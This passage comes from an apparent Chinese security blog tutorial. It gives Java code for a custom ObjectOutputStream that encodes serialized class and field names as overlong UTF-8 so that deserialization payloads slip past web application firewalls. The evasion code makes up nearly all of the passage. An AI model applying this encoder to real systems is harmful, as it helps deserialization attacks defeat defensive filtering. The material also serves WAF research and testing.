class="number">0xba</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;A&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x81</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;B&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x82</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;C&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x83</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;D&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x84</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;E&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x85</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;F&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x86</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;G&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x87</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;H&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x88</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;I&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x89</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;J&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8a</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;K&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;L&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8c</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;M&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;N&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8e</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;O&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8f</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;P&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x90</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x91</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;R&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x92</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;S&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x93</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;T&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x94</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;U&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x95</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;V&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x96</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;W&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x97</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;X&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x98</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x99</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9a</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(out);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line"><span class="comment">//        writeUTF(desc.getName());</span></span><br><span class="line">        writeShort(name.length() * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; name.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">s</span> <span class="operator">=</span> name.charAt(i);</span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line">            write(map.get(s)[<span class="number">0</span>]);</span><br><span class="line">            write(map.get(s)[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        writeLong(desc.getSerialVersionUID());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;externalizable&quot;</span>)) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">protocolField</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;protocol&quot;</span>);</span><br><span class="line">                protocolField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">protocol</span> <span class="operator">=</span> (<span class="type">int</span>) protocolField.get(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;serializable&quot;</span>))&#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;hasWriteObjectData&quot;</span>)) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;isEnum&quot;</span>) ) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">            &#125;</span><br><span class="line">            writeByte(flags);</span><br><span class="line">            ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc,<span class="string">&quot;fields&quot;</span>);</span><br><span class="line">            writeShort(fields.length);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[i];</span><br><span class="line">                writeByte(f.getTypeCode());</span><br><span class="line"><span class="comment">//                writeUTF(f.getName());</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fname</span> <span class="operator">=</span> f.getName();</span><br><span class="line">                writeShort(fname.length() * <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; fname.length(); j++) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">s</span> <span class="operator">=</span> fname.charAt(j);</span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line">                    write(map.get(s)[<span class="number">0</span>]);</span><br><span class="line">                    write(map.get(s)[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">writeTypeString</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredMethod(<span class="string">&quot;writeTypeString&quot;</span>,String.class);</span><br><span class="line">                    writeTypeString.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    writeTypeString.invoke(<span class="built_in">this</span>,f.getTypeString());</span><br><span class="line"><span class="comment">//                    writeTypeString(f.getTypeString());</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> field.get(object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectOutputStream</span>(fos);</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">    oos.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过这里只修改了各个类名为不可读，接口还没修改，不过WAF大概率也是拦截类名。</p>
+<p>我们还可以进一步把接口也给做相同的修改，只需要在writeUTF打上断点，看哪些地方调用了它写入数据</p>
+<p>找到了writeNonProxy中写入字段UTF的代码，把这里也修改（额外添加下划线的map）</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613162550376.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613162550376.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613162550376"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.TestCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomObjectOutputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectOutputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HashMap&lt;Character, <span class="type">int</span>[]&gt; map;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&#x27;.&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;;&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xbb</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;$&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;[&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;]&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;c&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;d&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;e&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;f&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;g&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;h&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;i&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;j&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaa</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;k&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xab</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;l&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xac</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;m&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xad</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;n&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;o&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaf</span>&#125;); <span class="comment">// 0x6f</span></span><br><span class="line">        map.put(<span class="string">&#x27;p&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb0</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;r&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;t&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;u&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;v&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;w&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;x&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xba</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;A&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x81</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;B&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x82</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;C&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x83</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;D&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x84</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;E&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x85</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;F&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x86</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;G&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x87</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;H&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x88</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;I&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x89</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;J&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8a</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;K&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;L&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8c</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;M&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;N&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8e</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;O&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8f</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;P&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x90</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x91</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;R&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x92</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;S&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x93</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;T&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x94</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;U&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x95</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;V&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x96</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;W&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x97</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;X&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x98</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x99</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9a</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(out);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line"><span class="comment">//        writeUTF(desc.getName());</span></span><br><span class="line">        writeShort(name.length() * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; name.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">s</span> <span class="operator">=</span> name.charAt(i);</span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line">            write(map.get(s)[<span class="number">0</span>]);</span><br><span class="line">            write(map.get(s)[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        